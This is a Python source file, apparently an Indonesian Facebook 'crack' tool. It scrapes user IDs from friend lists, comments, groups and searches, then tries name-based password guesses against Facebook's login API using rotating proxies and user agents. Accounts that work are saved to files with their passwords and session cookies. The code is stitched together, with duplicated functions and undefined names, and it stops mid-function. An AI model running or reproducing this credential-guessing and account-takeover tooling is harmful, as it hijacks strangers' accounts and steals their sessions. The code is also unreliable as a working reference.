import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
ugen2=[]
ugen=[] 
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
   
except Exception as e:
    exit(e)
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (X11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux x86_64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
		

try:
	print(f'\r\n╰─ sedang dump proxy dan create useragent')
	try:os.remove('.proxy.txt')
	except:pass
	uadev = ses.get("https://raw.githubusercontent.com/Aryan-mfc/MAX/main/Proxy2/Proxy2.txt").text
	if 'todmek' in uadev:pass
	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(f"╰─ tidak ada koneksi internet")

try:redmi = open('bbnew.txt','r').read().splitlines()
except:redmi = ["Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
try:abcd = open('proxy.txt','r').read().splitlines()
except:sys.exit(f"╰─ gagal dump proxy")
print('╰─ total new proxy\033[32m '+str(len(abcd)))
print('\033[0m╰─ total useragent\033[32m '+str(len(ugen)));print('\033[0m')
os.system('sleep 3')

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 

# BANNER
def banner():
	clear()
	print("""%s
\033[95m╔══╗─╔═══╗╔═══╗╔╗─╔╗╔═══╗╔╗──╔╗╔══╗╔══╗
\33[95m║╔╗║─║╔═╗║║╔═╗║║║─║║║╔═╗║║╚╗╔╝║╚╣─╝╚╣─╝
\033[95m║╚╝╚╗║║─║║║╚═╝║║║─║║║╚══╗╚╗║║╔╝─║║──║║─
\33[95m║╔═╗║║╚═╝║║╔╗╔╝║║─║║╚══╗║─║╚╝║──║║──║║─
\033[95m║╚═╝║║╔═╗║║║║╚╗║╚═╝║║╚═╝║─╚╗╔╝─╔╣─╗╔╣─╗
\33[95m╚═══╝╚╝─╚╝╚╝╚═╝╚═══╝╚═══╝──╚╝──╚══╝╚══╝
\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\x1b[0;34m█  \33[mAUTHOR: lupa
\x1b[0;34m█  \33[mRECODE: DEN 14 
\x1b[0;34m█  \33[mFacebook: DEN GINANJAR 
\x1b[0;34m█  \33[mWhatsApp: 085659810626
\x1b[0;34m█  \33[mTools : \33[1;96mPremium
\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""%(h))
	
	
def none():
	clear()
	print(''' (+) Private Script \n (+) Made By \x1b[1;91mDEN GINANJAR \x1b[1;97mCoder''')
def banner():
	clear()
	print(''' (+) Private Script \n (+) Made By \x1b[1;91mDENZ \x1b[1;97mCoder''')
class Login:
	def __init__(self):
		self.ip=ses.get("http://ip-api.com/json/").json()["query"]
		self.negara=ses.get("http://ip-api.com/json/").json()["country"]
	def menu_login(self):
		Logo().logonya()
		prints(Panel(f"{H2}\t                            Menu Login",width=87,style=f"{color_panel}"))
		prints(Panel(f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook ( {H2}Recomended{P2} )\n[{color_text}02{P2}]. login menggunakan No dan Password ( {M2}No Recomended{P2} )""",width=87,style=f"{color_panel}"))
		login=console.input(f" {U2}# {P2}pilih menu : ")
		if login in["1","01"]:
			prints(Panel(f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=87,style=f"{color_panel}"))
			cookie=console.input(f" {U2}# {P2}masukan cookie : ")
			self.login_cookie(cookie)
		else:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
	def login_cookie(self,cookie):
		try:
			url=ses.get("https://mbasic.facebook.com/",cookies={"cookie":cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get=ses.get("https://mbasic.facebook.com"+z["href"],cookies=cookie)
						parsing=parser(get.text,"html.parser")
						action=parsing.find("form",{"method":"post"})["action"]
						data={
						 "fb_dtsg":re.search("name=\"fb_dtsg\" value=\"(.*?)\"",str(get.text)).group(1),
						 "jazoest":re.search("name=\"jazoest\" value=\"(.*?)\"",str(get.text)).group(1),
						 "submit":"OK, Gunakan Data"
						}
						post=ses.post("https://mbasic.facebook.com"+action,data=data,cookies=cookie)
						break
			open("data/cookie","w").write(cookie)
			Menu().menu()
		except:
			prints(Panel(f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",width=87,style=f"{color_panel}"))
			sys.exit()
	def ubah_bahasa(self,cookie):
		try:
			url=ses.get("https://mbasic.facebook.com/language/",cookies={"cookie":cookie})
			parsing=parser(url.text,"html.parser")
			for x in parsing.find_all("form",{"method":"post"}):
				if "Bahasa Indonesia" in str(x):
					data={
					 "fb_dtsg":re.search("name=\"fb_dtsg\" value=\"(.*?)\"",str(url.text)).group(1),
					 "jazoest":re.search("name=\"jazoest\" value=\"(.*?)\"",str(url.text)).group(1),
					 "submit":"Bahasa Indonesia"
					}
					post=ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie":cookie})
		except:
			pass
def menu(self):
		Logo().logonya()
		try:
			cok=open("data/cookie","r").read()
			cookie={"cookie":cok}
			nama=self.cek_login(cookie)
		except:
			try:os.remove("data/cookie")
			except:pass
			Login().menu_login()
		pornhub=[]
		yonkou=[]
		self.jol=Console()
		self.tol=Console()
		prints(Panel(f"{U2}        {self.negara}",width=87,padding=(0,30),title=f"{B2}• {U2}• {AA}• {B2}Negara {B2}• {U2}• {AA}•",subtitle=f"{B2}• {U2}• {AA}• {B2}Version : {H2}0.0.1 {B2}• {U2}• {AA}•",style=eval(XWWWXXXWWXXXXXWWWX(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		yonkou.append(Panel(f" {B2}Nama Akun       {U2}: {AA}{nama}\n {B2}Status Pengguna {U2}: {H2}Premium\n {B2}Ip Address      {U2}: {AA}{self.ip}\n {B2}Tanggal         {U2}: {AA}{tgl}",width=43,padding=(0,2),title=f"{B2}• {U2}• {AA}• {B2}Info-User {B2}• {U2}• {AA}•",style=eval(XWWWXXXWWXXXXXWWWX(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		yonkou.append(Panel(f" {B2}Author   {U2}: {AA}Wild of D\n {B2}Github  {U2} : {AA}Luffy-XD\n{B2} Facebook {U2}: {AA}dika.tw.58\n{B2} Whatsapp {U2}: {AA}+62*************",width=43,padding=(0,2),title=f"{B2}• {U2}• {AA}• {B2}Info-Author {B2}• {U2}• {AA}•",style=eval(XWWWXXXWWXXXXXWWWX(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		self.jol.print(Columns(yonkou))
		prints(Panel(f"{B2}\t                           Daftar Menu",width=87,style=f"{color_panel}"))
		pornhub.append(Panel(f"{P2}[{U2}01{P2}]. {B2}crack {AA}dari {U2}id publik\n{P2}[{U2}02{P2}]. {B2}crack {AA}dari {U2}pengikut\n{P2}[{U2}03{P2}]. {B2}crack {AA}dari {U2}komentar\n{P2}[{U2}04{P2}]. {B2}crack {AA}dari {U2}random email",width=43,padding=(0,2),style=f"{color_panel}"))
		pornhub.append(Panel(f"{P2}[{U2}05{P2}]. {B2}crack {AA}dari {U2}pencarian nama\n{P2}[{U2}06{P2}]. {B2}crack {AA}dari {U2}member grup\n{P2}[{U2}07{P2}]. {B2}crack {AA}dari {U2}file sendiri\n{P2}[{U2}08{P2}]. {U2}cek {AA}opsi {U2}checkpoint",width=43,padding=(0,2),style=f"{color_panel}"))
		self.tol.print(Columns(pornhub))
		prints(Panel(f"""{P2}   ketik {M2}logout{P2} untuk hapus cookie dan ketik {B2}lain{P2} untuk ke menu lain""",width=87,padding=(0,6),style=f"{color_panel}"))
		menu=console.input(f" {U2}# {P2}pilih menu : ")
		if menu in["logout"]:
			os.system("rm data/cookie")
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python haki-fb.py""",width=87,style=f"{color_panel}")))
		elif menu in["1","01"]:
			prints(Panel(f"""{P2}     masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {B2}me{P2} untuk dump dari teman sendiri",width=87,style=eval(XWWWXXXWWXXXXXWWWX(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			user=console.input(f" {U2}# {P2}masukan id atau username : ")
			if user in["Me","me"]:
				user=Dump(cookie).GetUser()
			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
			Crack().atursandi()
		elif menu in["3","03"]:
			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=87,style=f"{color_panel}"))
			user=console.input(f" {U}# {P2}masukan id postingan : ")
			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
			Crack().atursandi()
		elif menu in["4","04"]:
			prints(Panel(f"""{P2}masukan nama untuk email, format email akan selalu @gmail.com""",width=87,style=f"{color_panel}"))
			user=console.input(f" {U2}# {P2}masukan nama : ")
			limit=console.input(f" {U2}# {P2}masukan limit : ")
			Dump(cookie).Dump_Email(user,limit)
			Crack().atursandi()
		elif menu in["5","05"]:
			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=87,style=f"{color_panel}"))
			user=console.input(f" {U2}# {P2}masukan nama : ")
			common=open("Haki/nama_indonesia","r").read().splitlines()
			for idt in user.split(","):
				self.id.append(idt)
				for people in common:
					self.id.append(people+" "+idt)
			try:
				for gas in self.id:
					Dump(cookie).Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
			except:pass
			Crack().atursandi()
		elif menu in["6","06"]:
			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=87,style=f"{color_panel}"))
			user=console.input(f" {U}# {P2}masukan id grup : ")
			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
			Crack().atursandi()
		elif menu in["7","07"]:
			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=87,style=f"{color_panel}"))
			user=console.input(f" {U2}# {P2}masukan tempat file : ")
			Dump(cookie).Dump_File(user)
			Crack().atursandi()
		elif menu in["BOT","Bot","bot"]:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
		elif menu in["8","08"]:
			file_cp()
		elif menu in["LAIN","Lain","lain"]:
			Lain(cookie).menu()
		else:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
class Dump:
	def __init__(self,cookie):
		self.cookie=cookie
	def GetUser(self):
		try:
			url=ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
			uid=re.findall("name=\"target\" value=\"(.*?)\"",url)[0]
			return uid
		except:
			pass
	def Dump_Publik(self,url):
		try:
			url=parser(ses.get(url,cookies=self.cookie).text,"html.parser")
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					if "/profile.php?id=" in z.get("href"):uid="".join(bs4.re.findall("profile\\.php\\?id=(.*?)&",z.get("href")));nama=z.text
					else:uid="".join(bs4.re.findall("/(.*?)\\?",z.get("href")));nama=z.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {U2}# {P2}sedang proses mengumpulkan {U2}id{P2}, berhasil mendapatkan{B2} {len(tampung)} {P2}id....",end="\r")
			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text:
					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
		except:pass
	def Dump_Komentar(self,url):
		try:
			data=parser(ses.get(url).text,"html.parser")
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid=ids.get("href").split("=")[1].replace("&refid","")
					else:uid=re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
					nama=ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {U2}# {P2}sedang proses mengumpulkan {U2}id{P2}, berhasil mendapatkan{B2} {len(tampung)} {P2}id....",end="\r")
			for z in data.find_all("a",href=True):
				if "Lihat komentar sebelumnya…" in z.text:
					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
		except:pass
	def Dump_Pencarian(self,url):
		try:
			data=parser(ses.get(str(url)).text,"html.parser")
			for z in data.find_all("td"):
				namp=re.findall("\\<a\\ href\\=\"\\/(.*?)\">\\<div\\ class\\=\".*?\">\\<div\\ class\\=\".*?\">(.*?)<\\/div\\>",str(z))
				for uid,nama in namp:
					if "profile.php?" in uid:uid=re.findall("id=(.*)",str(uid))[0]
					elif "<span" in nama:nama=re.findall("(.*?)\\<",str(nama))[0]
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {U2}# {P2}sedang proses mengumpulkan {U2}id{P2}, berhasil mendapatkan{B2} {len(tampung)} {P2}id....",end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Hasil Selanjutnya" in x.text:
					self.Dump_Pencarian(x.get("href"))
		except:pass
	def Dump_MemberGrup(self,url):
		try:
			data=parser(ses.get(url,cookies=self.cookie,headers={"user-agent":"Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text,"html.parser")
			judul=re.findall("<title>(.*?)</title>",str(data))[0]
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid=ids.get("href").split("=")[1].replace("&eav","");nama=ids.text
					else:
						if ids.text==judul:pass
						else:uid=ids.get("href").split("/")[1].split("?")[0];nama=ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {U2}# {P2}sedang proses mengumpulkan {U2}id{P2}, berhasil mendapatkan{B2} {len(tampung)} {P2}id....",end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Postingan Lainnya" in x.text:
					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
		except:pass
	def Dump_File(self,lok):
		try:
			file=open(lok,"r").read().splitlines()
			for z in file:
				tampung.append(z)
		except:pass
	def Dump_Email(self,nama,limit):
		try:
			for z in range(int(limit)):
				email=nama+str(z)+"@gmail.com<=>"+nama
				if email in tampung:pass
				else:tampung.append(email)
		except:pass
class Crack:
	def __init__(self):
		self.loop=0
		self.ok=[]
		self.cp=[]
		self.hari_ini=datetime.now().strftime("%d-%B-%Y")
	def atursandi(self):
		prints(Panel(f"""{P2}    berhasil mengumpulkan{B2} {len(tampung)} {P2}id""",width=87,padding=(0,21),style=f"{color_panel}"))
		set=console.input(f" {U2}# {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
		if set in["Y","y"]:
			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=87,style=f"{color_panel}"))
			pwx=console.input(f" {U2}# {P2}buat katasandi : ").split(",")
			if len(pwx)<=5:
				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=87,style=f"{color_panel}"))
				exit()
			self.manual(pwx)
		else:
			self.otomatis()
	def manual(self,pw):
		global prog,des
		prog=Progress(SpinnerColumn("clock"),TextColumn("{task.description}"),BarColumn(),TextColumn("{task.percentage:.0f}% ]"))
		des=prog.add_task("",total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30)as fall:
				self.simpan_hasil()
				for data in tampung:
					user=data.split("<=>")[0]
					nama=data.split("<=>")[1]
					pwx=pw
					fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
	def otomatis(self):
		global prog,des
		prog=Progress(TextColumn("{task.description}"),BarColumn(),TextColumn("{task.percentage:.0f}% ]"))
		des=prog.add_task("",total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30)as fall:
				self.simpan_hasil()
				for data in tampung:
					try:
						pwx=[]
						user=data.split("<=>")[0]
						nama=data.split("<=>")[1]
						depan=nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+"123")
								pwx.append(depan+"111")
								pwx.append(depan+"321")
								pwx.append(depan+"1234")
								pwx.append(depan+"12345")
								pwx.append(depan+"123456")
								pwx.append("ganteng")
								pwx.append("moonton")
								pwx.append("ganteng123")
								pwx.append("katasandi")
								pwx.append("freefire")
								pwx.append("freefire123")
						else:
							if len(depan)<3:
								pwx.append(nama)
								pwx.append(nama+"123")
								pwx.append(nama+"321")
							else:
								pwx.append(nama)
								pwx.append(depan+"123")
								pwx.append(depan+"321")
								pwx.append(depan+"1234")
								pwx.append(depan+"12345")
								pwx.append(depan+"123456")
								pwx.append("kata sandi")
								pwx.append("free fire")
								pwx.append("free fire123")
								pwx.append("123456")
							belakang=nama.split(" ")[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
								pwx.append(depan+belakang+"123")
								pwx.append(depan+belakang+"321")
								pwx.append(depan+belakang+"1234")
								pwx.append(depan+belakang+"12345")
								pwx.append(depan+belakang+"123456")
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+"123")
								pwx.append(belakang+"321")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append("kontol")
								pwx.append("bangsat")
								pwx.append("indonesia")
								pwx.append("kontol123")
								pwx.append("bismillah")
								pwx.append("mobile legends")
								pwx.append("domino123")
						fall.submit(self.metode_api,user,pwx)
					except:
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}   berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=87,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {P2}# {H2}Luffy-XD {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {U2}{len(self.ok)}{P2} CP : {B2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw=pw.lower()
				ua=random.choice(ugent)
				params={
				 "access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
				 "sdk_version":{random.randint(1,26)},
				 "email":email,
				 "locale":"en_US",
				 "password":pw,
				 "sdk":"android",
				 "generate_session_cookies":"1",
				 "sig":"4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				headers={
				 "Host":"graph.facebook.com",
				 "x-fb-connection-bandwidth":str(random.randint(20000000,30000000)),
				 "x-fb-sim-hni":str(random.randint(20000,40000)),
				 "x-fb-net-hni":str(random.randint(20000,40000)),
				 "x-fb-connection-quality":"EXCELLENT",
				 "user-agent":ua,
				 "content-type":"application/x-www-form-urlencoded",
				 "x-fb-http-engine":"Liger"
				}
				post=ses.post("https://graph.facebook.com/auth/login",params=params,headers=headers,allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki=";".join(i["name"]+"="+i["value"]for i in post.json()["session_cookies"])
					user=re.findall("c_user=(\\d+)",coki)[0]
					if user in self.ok or user in self.cp:
						break
					else:
						self.ok.append(user)
						tree=Tree(" ",guide_style=f"{color_ok}")
						tree.add(Panel(f"{U2}       Succes-Login{P2}",width=30,padding=(0,2),style=f"{color_ok}"))
						tree.add(f"\r{AA}User ID {P2}  : {U2}{user}")
						tree.add(f"{AA}Password {P2} : {U2}{pw}")
						tree.add(Panel(f"{U2}{coki}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
						tree.add(Panel(f"{U2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
						prints(tree)
						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
						break
				elif "User must verify their account" in post.text:
					user=post.json()["error"]["error_data"]["uid"]
					if user in self.ok or user in self.cp:
						break
					else:
						self.cp.append(user)
						tree=Tree(" ",guide_style=f"{color_cp}")
						tree.add(Panel(f"{B2}   Checkpoint-Login{P2}",width=30,padding=(0,2),style=f"{color_cp}"))
						tree.add(f"\r{AA}User ID {P2}     : {B2}{user}")
						tree.add(f"{AA}Password {P2}    : {B2}{pw}")
						tree.add(Panel(f"{B2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_cp}"))
						prints(tree)
						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
					prog.advance(des)
					time.sleep(30)
				else:continue
		except ConnectionError:
			time.sleep(30)
			self.metode_api(user,pwx)
		self.loop+=1

def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s \033[0mcookie invalid"%(M))

kentod = random.choice(["MORHE-UUQDM-OOFJR-IBRJZ","LIMPL-XDZGC-NNVDR-NXGXK","LHEZL-RPKJG-IPPOR-YWXGV","JOJQR-GKFVW-VLYJT-UNITI","GSNEP-NTRCE-CTKYK-OIAGD","LTQVM-NRQSC-LVJCL-SVQTD","HCYUY-ADXUB-MPCVJ-DGNQE","JHSQH-YAYOT-WDWFU-FAYIV","MTIRZ-YXKRT-ZEYGN-UWJMK","LWGOO-ZPRNJ-FKDXT-YNBZB","GTSCS-MEXZL-YXMLX-NLUCT","KWQRM-ROFYY-YLBST-BKXAE","LISBX-TPVSB-WXKEV-XOMIB","JVFEN-WKCFP-XLLXV-GAKUS","LEHBK-GBLHK-NACGN-EEHUW","KAEPL-IBDPP-WQYGN-PMUSI","KVIZG-ILJVO-EKFYT-THGKZ"])


kentodd=random.choice([kentod])


crot=(kentodd)


import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s [%s\033[0m \033[0mpilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m Masukan file [ cth%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
